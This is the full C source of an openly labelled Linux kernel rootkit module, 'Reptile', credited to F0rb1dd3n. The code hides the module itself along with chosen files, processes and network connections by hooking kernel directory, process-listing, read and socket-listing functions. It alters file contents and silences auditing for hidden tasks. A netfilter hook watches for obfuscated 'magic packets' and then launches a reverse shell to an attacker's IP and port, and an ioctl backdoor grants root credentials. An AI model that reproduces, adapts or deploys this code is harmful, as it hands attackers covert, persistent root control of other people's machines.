/* REPTILE ROOTKIT
 *
 * A LKM Linux rootkit
 * Author: F0rb1dd3n
 *
 */

#include <linux/audit.h>
#include <linux/binfmts.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/uaccess.h>
#include <linux/udp.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/workqueue.h>
#include <net/inet_sock.h>

#include "config.h"
#include "khook/engine.c"

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

#define bzero(b, len) (memset((b), '\0', (len)), (void)0)
#define SSIZE_MAX 32767
#define FLAG 0x80000000
#define RL_BUFSIZE 2048
#define TOK_BUFSIZE 64
#define TOK_DELIM                                      \
	({                                             \
		unsigned int *p = __builtin_alloca(4); \
		p[0] = 0x00000020;                     \
		(char *)p;                             \
	})

/*  
 *  All these definitions below is random and can be changed if you want
 *  But make sure you will change that in sbin/util.h
 */
#define ID 12345
#define SEQ 28782
#define WIN 8192

int hidden = 1, hide_module = 0, file_tampering = 0, control_flag = 0;
struct workqueue_struct *work_queue;
static struct nf_hook_ops magic_packet_hook_options;
static struct list_head *mod_list;

struct control {
	unsigned short cmd;
	void *argv;
};

struct shell_task {
	struct work_struct work;
	char *path;
	char *ip;
	char *port;
	char *secret;
};

struct tgid_iter {
	unsigned int tgid;
	struct task_struct *task;
};

struct hidden_conn {
	struct sockaddr_in addr;
	struct list_head list;
};

LIST_HEAD(hidden_tcp_conn);
LIST_HEAD(hidden_udp_conn);

void hide(void)
{
	if (hide_module)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	hide_module = 1;
}

void show(void)
{
	if (!hide_module)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);
	hide_module = 0;
}

int flag_tasks(pid_t pid, int set)
{
	int ret = 0;
	struct pid *p;

	rcu_read_lock();
	p = find_get_pid(pid);
	if (p) {
		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
		if (task) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			struct task_struct *t = NULL;

			for_each_thread(task, t)
			{
				if (set)
					t->flags |= FLAG;
				else
					t->flags &= ~FLAG;

				ret++;
			}
#endif
			if (set)
				task->flags |= FLAG;
			else
				task->flags &= ~FLAG;

			put_task_struct(task);
		}
		put_pid(p);
	}
	rcu_read_unlock();
	return ret;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	struct task_struct *ret = NULL;

	rcu_read_lock();
	for_each_process(p)
	{
		if (p->pid == pid) {
			get_task_struct(p);
			ret = p;
		}
	}
	rcu_read_unlock();

	return ret;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;

	task = find_task(pid);
	if (!task)
		return ret;

	if (task->flags & FLAG)
		ret = 1;

	put_task_struct(task);
	return ret;
}

int exec(char **argv)
{
	char *path = PATH;
	char *envp[] = {path, NULL};
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void shell_execer(struct work_struct *work)
{
	struct shell_task *task = (struct shell_task *)work;
	char *argv[] = {task->path,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000742d;
				(char *)p;
			}),
			task->ip,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000702d;
				(char *)p;
			}),
			task->port,
			({
				unsigned int *p = __builtin_alloca(4);
				p[0] = 0x0000732d;
				(char *)p;
			}),
			task->secret,
			NULL};

	exec(argv);
	kfree(task->path);
	kfree(task->ip);
	kfree(task->port);
	kfree(task->secret);
	kfree(task);
}

int shell_exec_queue(char *path, char *ip, char *port, char *secret)
{
	struct shell_task *task;

	task = kmalloc(sizeof(*task), GFP_KERNEL);

	if (!task)
		return -1;

	REPTILE_INIT_WORK(&task->work, &shell_execer);
	task->path = kstrdup(path, GFP_KERNEL);
	if (!task->path) {
		kfree(task);
		return -1;
	}

	task->ip = kstrdup(ip, GFP_KERNEL);
	if (!task->ip) {
		kfree(task->path);
		kfree(task);
		return -1;
	}

	task->port = kstrdup(port, GFP_KERNEL);
	if (!task->port) {
		kfree(task->path);
		kfree(task->ip);
		kfree(task);
		return -1;
	}

	task->secret = kstrdup(secret, GFP_KERNEL);
	if (!task->secret) {
		kfree(task->path);
		kfree(task->ip);
		kfree(task->port);
		kfree(task);
		return -1;
	}

	return queue_work(work_queue, &task->work);
}

int f_check(void *arg, ssize_t size)
{
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX))
		return (-1);

	buf = (char *)kmalloc(size + 1, GFP_KERNEL);
	if (!buf)
		return (-1);

	if (copy_from_user((void *)buf, (void *)arg, size))
		goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) &&
	    (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return (1);
	}
out:
	kfree(buf);
	return (-1);
}

int hide_content(void *arg, ssize_t size)
{
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *)kmalloc(size, GFP_KERNEL);
	if (!buf)
		return (-1);

	if (copy_from_user((void *)buf, (void *)arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	if (p1 >= p2 || !p1 || !p2) {
		kfree(buf);
		return size;
	}

	i = size - (p2 - buf);
	memmove((void *)p1, (void *)p2, i);
	newret = size - (p2 - p1);

	if (copy_to_user((void *)arg, (void *)buf, newret)) {
		kfree(buf);
		return size;
	}

	kfree(buf);
	return newret;
}

char **parse(char *line)
{
	int bufsize = TOK_BUFSIZE, position = 0;
	char **tokens = kmalloc(bufsize * sizeof(char *), GFP_KERNEL);
	char *token, **tokens_backup;

	if (!tokens)
		return NULL;

	token = line;
	token = strsep(&line, TOK_DELIM);
	while (token != NULL) {
		tokens[position] = token;
		position++;

		if (position >= bufsize) {
			bufsize += TOK_BUFSIZE;
			tokens_backup = tokens;
			tokens = krealloc(tokens, bufsize * sizeof(char *), GFP_KERNEL);
			if (!tokens) {
				kfree(tokens_backup);
				return NULL;
			}
		}

		token = strsep(&line, TOK_DELIM);
	}
	tokens[position] = NULL;
	return tokens;
}

void _xor(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] ^= key;
}

void _add(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] += key;
}

void _sub(char *arg, int key, int nbytes)
{
	int i;
	for (i = 0; i < nbytes; i++)
		arg[i] -= key;
}

unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
			    			   struct sk_buff *socket_buffer,
			    			   const struct net_device *in,
							   const struct net_device *out,
							   int (*okfn)(struct sk_buff *))
{
	const struct iphdr *ip_header;
	const struct icmphdr *icmp_header;
	const struct tcphdr *tcp_header;
	const struct udphdr *udp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	struct tcphdr _tcph;
	struct udphdr _udph;
	const char *data = NULL;
	char *_data, *string, **args;
	char *token = TOKEN;
	int size, tok_len;

	tok_len = strlen(token);
	_xor(token, 11, tok_len);
	_add(token, 15, tok_len);

	if (!socket_buffer)
		return NF_ACCEPT;

	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

	if (!ip_header)
		return NF_ACCEPT;

	if (!ip_header->protocol)
		return NF_ACCEPT;

	if (htons(ip_header->id) != ID)
		return NF_ACCEPT;

	if (ip_header->protocol == IPPROTO_TCP) {
		tcp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);

		if (!tcp_header)
			return NF_ACCEPT;

		if (htons(tcp_header->source) != SRCPORT)
			return NF_ACCEPT;

		if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use tcp_header->seq as filter */
		    htons(tcp_header->window) == WIN) {
			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						ip_header->ihl * 4 + sizeof(struct tcphdr),
						size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1], args[2], PASS);
					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	if (ip_header->protocol == IPPROTO_ICMP) {
		icmp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

		if (!icmp_header)
			return NF_ACCEPT;

		if (icmp_header->code != ICMP_ECHO)
			return NF_ACCEPT;

		if (htons(icmp_header->un.echo.sequence) == SEQ &&
		    htons(icmp_header->un.echo.id) == WIN) {

			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						ip_header->ihl * 4 + sizeof(struct icmphdr),
						size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1], args[2], PASS);
					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	if (ip_header->protocol == IPPROTO_UDP) {
		udp_header = skb_header_pointer(
		    socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);

		if (!udp_header)
			return NF_ACCEPT;

		if (htons(udp_header->source) != SRCPORT)
			return NF_ACCEPT;

		if (htons(udp_header->len) <=
		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {

			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_udph);

			_data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;

			string = kmalloc(size + 1, GFP_KERNEL);

			if (!string) {
				kfree(_data);
				return NF_ACCEPT;
			}

			data = skb_header_pointer(socket_buffer,
						ip_header->ihl * 4 + sizeof(struct udphdr),
						size, &_data);

			if (!data) {
				kfree(_data);
				kfree(string);
				return NF_ACCEPT;
			}

			if (memcmp(data, token, tok_len) == 0) {

				bzero(string, size + 1);
				memcpy(string, data, size);

				_sub(string, 15, size);
				_xor(string, 11, size);

				args = parse(string);

				if (args) {
					shell_exec_queue(SHELL, args[1], args[2], PASS);
					kfree(args);
				}

				kfree(_data);
				kfree(string);

				return NF_DROP;
			}

			kfree(_data);
			kfree(string);
		}
	}

	return NF_ACCEPT;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
#else
KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, HIDE) || !hidden)
		found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}

KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
{
	if (hidden) {
		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
			if (!(iter.task->flags & FLAG))
				break;

			iter.tgid++;
		}
	} else {
		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
	}
	return iter;
}

KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
static ssize_t khook_vfs_read(struct file *file, char __user *buf,
			      size_t count, loff_t *pos)
{
	ssize_t ret;

	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);

	if (file_tampering) {
		if (f_check(buf, ret) == 1)
			ret = hide_content(buf, ret);
	}

	return ret;
}

KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
			    unsigned long arg)
{
	int ret = 0;
	unsigned int pid;
	struct control args;
	struct sockaddr_in addr;
	struct hidden_conn *hc;

	if (cmd == AUTH && arg == HTUA) {
		if (control_flag) {
			control_flag = 0;
		} else {
			control_flag = 1;
		}

		goto out;
	}

	if (control_flag && cmd == AUTH) {
		if (copy_from_user(&args, (void *)arg, sizeof(args)))
			goto out;

		switch (args.cmd) {
		case 0:
			if (hide_module) {
				show();
				hidden = 0;
			} else {
				hide();
				hidden = 1;
			}
			break;
		case 1:
			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
				goto out;

			if (is_invisible(pid))
				flag_tasks(pid, 0);
			else
				flag_tasks(pid, 1);

			break;
		case 2:
			if (file_tampering)
				file_tampering = 0;
			else
				file_tampering = 1;
			break;
		case 3:
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
			current->uid = 0;
			current->suid = 0;
			current->euid = 0;
			current->gid = 0;
			current->egid = 0;
			current->fsuid = 0;
			current->fsgid = 0;
			cap_set_full(current->cap_effective);
			cap_set_full(current->cap_inheritable);
			cap_set_full(current->cap_permitted);
#else
			commit_creds(prepare_kernel_cred(0));
#endif
			break;
		case 4:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			hc = kmalloc(sizeof(*hc), GFP_KERNEL);

			if (!hc)
				goto out;

			hc->addr = addr;

			list_add(&hc->list, &hidden_tcp_conn);
			break;
		case 5:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			list_for_each_entry(hc, &hidden_tcp_conn, list)
			{
				if (addr.sin_port == hc->addr.sin_port &&
				    addr.sin_addr.s_addr ==
					hc->addr.sin_addr.s_addr) {
					list_del(&hc->list);
					kfree(hc);
					break;
				}
			}
			break;
		case 6:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			hc = kmalloc(sizeof(*hc), GFP_KERNEL);

			if (!hc)
				goto out;

			hc->addr = addr;

			list_add(&hc->list, &hidden_udp_conn);
			break;
		case 7:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			list_for_each_entry(hc, &hidden_udp_conn, list)
			{
				if (addr.sin_port == hc->addr.sin_port &&
				    addr.sin_addr.s_addr ==
					hc->addr.sin_addr.s_addr) {
					list_del(&hc->list);
					kfree(hc);
					break;
				}
			}
			break;
		default:
			goto origin;
		}

		goto out;
	}

origin:
	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
out:
	return ret;
}

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned short dport;
	unsigned int daddr;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	dport = inet->inet_dport;
	daddr = inet->inet_daddr;
#else
	dport = inet->dport;
	daddr = inet->daddr;
#endif

	list_for_each_entry(hc, &hidden_tcp_conn, list)
	{
		if ( //hc->addr.sin_port == dport &&
		    hc->addr.sin_addr.s_addr == daddr) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned short dport;
	unsigned int daddr;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	dport = inet->inet_dport;
	daddr = inet->inet_daddr;
#else
	dport = inet->dport;
	daddr = inet->daddr;
#endif

	list_for_each_entry(hc, &hidden_udp_conn, list)
	{
		if ( //hc->addr.sin_port == dport &&
		    hc->addr.sin_addr.s_addr == daddr) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
	if (!ret && !strcmp(bprm->filename, SHELL))
		flag_tasks(current->pid, 1);

	return ret;
}

KHOOK(copy_creds);
static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
	if (!ret && current->flags & FLAG)
		p->flags |= FLAG;

	return ret;
}

KHOOK(exit_creds);
static void khook_exit_creds(struct task_struct *p)
{
	KHOOK_ORIGIN(exit_creds, p);
	if (p->flags & FLAG)
		p->flags &= ~FLAG;
}

KHOOK(audit_alloc);
static int khook_audit_alloc(struct task_struct *t)
{
	int err = 0;

	if (t->flags & FLAG) {
		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
	} else {
		err = KHOOK_ORIGIN(audit_alloc, t);
	}
	return err;
}

KHOOK(find_task_by_vpid);
struct task_struct *khook_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;

	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
		tsk = NULL;

	return tsk;
}

static int __init reptile_init(void)
{
	int ret;
	char *argv[] = {START, NULL, NULL};

	work_queue = create_workqueue(WORKQUEUE);

	ret = khook_init();

	if (ret != 0)
		goto out;

	magic_packet_hook_options.hook = (void *)magic_packet_hook;
	magic_packet_hook_options.hooknum = 0;
	magic_packet_hook_options.pf = PF_INET;
	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_register_net_hook(&init_net, &magic_packet_hook_options);
#else
	nf_register_hook(&magic_packet_hook_options);
#endif
	
	exec(argv);
	hide();
out:
	return ret;
}

static void __exit reptile_exit(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
#else
	nf_unregister_hook(&magic_packet_hook_options);
#endif

	flush_workqueue(work_queue);
	destroy_workqueue(work_queue);
	khook_cleanup();
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
